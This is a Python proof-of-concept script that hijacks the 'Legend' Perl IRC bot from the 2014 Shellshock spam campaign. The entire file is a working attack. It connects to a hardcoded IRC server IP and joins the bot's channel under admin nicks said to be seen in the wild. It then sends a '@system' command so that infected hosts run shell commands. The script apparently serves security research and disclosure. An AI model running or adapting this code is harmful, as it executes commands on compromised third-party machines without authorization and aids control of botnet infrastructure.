#
# legend_rce.py
# Legend Perl IRC Bot Remote Code Execution PoC
# author: Jay Turla ( @shipcod3 )
# description: This is a RCE PoC for Legend Bot which has been used in the Shellshock spam October 2014. 
# reference: http://www.csoonline.com/article/2839054/vulnerabilities/report-criminals-use-shellshock-against-mail-servers-to-build-botnet.html
# greetz to ROOTCON (rootcon.org) goons
#

import socket
import sys

def usage():
     print("USAGE: python legend_rce.py nick")
     print("Sample nicks found in the wild: god, ARZ, Zax, HackTech, TheChozen")
     
def main(argv):
    
    if len(argv) < 2:
        return usage()

    #irc server connection settings
    botnick = sys.argv[1] #admin payload for taking over the Legend Bot
    server = "80.246.50.71" #irc server
    channel = "#Apache" #channel where the bot is located

    irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
    print "connecting to:"+server
    irc.connect((server, 2015)) #connects to the server, you can change the port by changing 2015 for example :)
    irc.send("USER "+ botnick +" "+ botnick +" "+ botnick +" :legend.rocks\n") #user authentication
    irc.send("NICK "+ botnick +"\n") #sets nick
    irc.send("JOIN "+ channel +"\n") #join the chan
    irc.send("PRIVMSG "+channel+" :!legend @system 'uname -a' \n") #send the payload to the bot

    while 1:    #puts it in a loop
        text=irc.recv(2040)  #receive the text
        print text   #print text to console

        if text.find('PING') != -1:                          #check if 'PING' is found
            irc.send('PONG ' + text.split() [1] + '\r\n') #returns 'PONG' back to the server (prevents pinging out!)
        if text.find('!quit') != -1: #quit the Bot
            irc.send ("QUIT\r\n") 
            sys.exit()
        if text.find('Linux') != -1:                         
            irc.send("PRIVMSG "+channel+" :The bot answers to "+botnick+" which allows command execution \r\n")
            irc.send ("QUIT\r\n")
            sys.exit()

if __name__ == "__main__":
    main(sys.argv)
